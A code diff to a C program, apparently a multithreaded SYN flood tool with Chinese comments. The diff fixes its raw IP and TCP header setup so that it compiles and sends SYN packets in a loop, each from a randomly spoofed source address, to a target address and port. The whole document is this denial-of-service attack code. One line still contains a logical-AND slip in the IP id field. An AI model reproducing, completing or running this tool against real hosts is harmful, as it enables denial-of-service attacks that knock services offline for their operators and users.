@@ -21,7 +21,8 @@
 #include <arpa/inet.h>
 #include <pthread.h>
 #include <netinet/ip.h>
-// #include "../header/packet_struct.h"
+#include <netinet/tcp.h>
+#include "../header/packet_struct.h"
 
 /* 最多线程数 */
 #define MAXCHILD 128
@@ -60,31 +61,30 @@ unsigned short check_sum (unsigned short *buffer, unsigned short size){
  * TCP伪头部仅用于校验和的计算
 
  */
-void init_header(struct iphdr *ip_hdr, struct tcphdr *tcp, struct pseudohdr *pseudoheader){
-	int len = sizeof(struct ip) + sizeof(struct tcphdr);
+void init_header(struct iphdr *ip_hdr, struct tcphdr *tcp_hdr, struct pseudohdr *pseudoheader){
+	int len = sizeof(struct iphdr) + sizeof(struct tcphdr);
 	// IP头部数据初始化
 	ip_hdr->version = 4;
-	ip_hdr->ihl = (4<<4 | sizeof(struct ip)/sizeof(unsigned int));
+	ip_hdr->ihl = 5;
 	ip_hdr->tos = 0;
 	ip_hdr->tot_len = htons(len);
 	ip_hdr->id = random() && 0x00ffff;
-	ip->frag_off = htons(0);
-	ip->ttl = 255;
-	ip->protocol = IPPROTO_TCP;
-	ip->check = 0;
-	ip->saddr = 0;
-	ip->daddr = inet_addr(dst_ip);
+	ip_hdr->frag_off = htons(0);
+	ip_hdr->ttl = 255;
+	ip_hdr->protocol = IPPROTO_TCP;
+	ip_hdr->check = 0;
+	ip_hdr->saddr = 0;
+	ip_hdr->daddr = inet_addr(dst_ip);
 
 	// TCP头部数据初始化
-	tcp->sport = htons( rand()%16383 + 49152 );
-	tcp->dport = htons(dst_port);
-	tcp->seq = htonl( rand()%90000000 + 2345 ); 
-	tcp->ack = 0; 
-	tcp->lenres = (sizeof(struct tcphdr)/4<<4|0);
-	tcp->flag = 0x02;
-	tcp->win = htons (2048);  
-	tcp->sum = 0;
-	tcp->urp = 0;
+	tcp_hdr->th_sport = htons( rand()%16383 + 49152 );
+	tcp_hdr->th_dport = htons(dst_port);
+	tcp_hdr->th_seq = htonl( rand()%90000000 + 2345 ); 
+	tcp_hdr->th_ack = 0; 
+	tcp_hdr->th_flags = TH_SYN;
+	tcp_hdr->th_win = htons (2048);  
+	tcp_hdr->th_sum = 0;
+	tcp_hdr->th_urp = 0;
 
 	//TCP伪头部
 	pseudoheader->zero = 0;
@@ -104,36 +104,36 @@ void* send_synflood(void *addr_info){
         struct sockaddr_in *addr = (struct sockaddr_in *)addr_info;
 	char buf[100], sendbuf[100];
 	int len;
-	struct ip ip;			//IP头部
-	struct tcphdr tcp;		//TCP头部
+	struct iphdr ip_hdr;			//IP头部
+	struct tcphdr tcp_hdr;		//TCP头部
 	struct pseudohdr pseudoheader;	//TCP伪头部
 
 
-	len = sizeof(struct ip) + sizeof(struct tcphdr);
+	len = sizeof(struct iphdr) + sizeof(struct tcphdr);
 	
 	/* 初始化头部信息 */
-	init_header(&ip, &tcp, &pseudoheader);
+	init_header(&ip_hdr, &tcp_hdr, &pseudoheader);
 	
 	/* 处于活动状态时持续发送SYN包 */
 	while(alive){
-		ip.sourceIP = rand();
+		ip_hdr.saddr = rand();
 
 		//计算IP校验和
 		bzero(buf, sizeof(buf));
-		memcpy(buf , &ip, sizeof(struct ip));
-		ip.checksum = check_sum((u_short *) buf, sizeof(struct ip));
+		memcpy(buf , &ip_hdr, sizeof(struct iphdr));
+		ip_hdr.check = check_sum((u_short *) buf, sizeof(struct iphdr));
 
-		pseudoheader.saddr = ip.sourceIP;
+		pseudoheader.saddr = ip_hdr.saddr;
 
 		//计算TCP校验和
 		bzero(buf, sizeof(buf));
 		memcpy(buf , &pseudoheader, sizeof(pseudoheader));
-		memcpy(buf+sizeof(pseudoheader), &tcp, sizeof(struct tcphdr));
-		tcp.sum = check_sum((u_short *) buf, sizeof(pseudoheader)+sizeof(struct tcphdr));
+		memcpy(buf+sizeof(pseudoheader), &tcp_hdr, sizeof(struct tcphdr));
+		tcp_hdr.th_sum = check_sum((u_short *) buf, sizeof(pseudoheader)+sizeof(struct tcphdr));
 
 		bzero(sendbuf, sizeof(sendbuf));
-		memcpy(sendbuf, &ip, sizeof(struct ip));
-		memcpy(sendbuf+sizeof(struct ip), &tcp, sizeof(struct tcphdr));
+		memcpy(sendbuf, &ip_hdr, sizeof(struct iphdr));
+		memcpy(sendbuf+sizeof(struct iphdr), &tcp_hdr, sizeof(struct tcphdr));
 		printf(".");
 		if (sendto(sockfd, sendbuf, len, 0, (struct sockaddr *) addr, sizeof(struct sockaddr))< 0){
 			perror("sendto()");
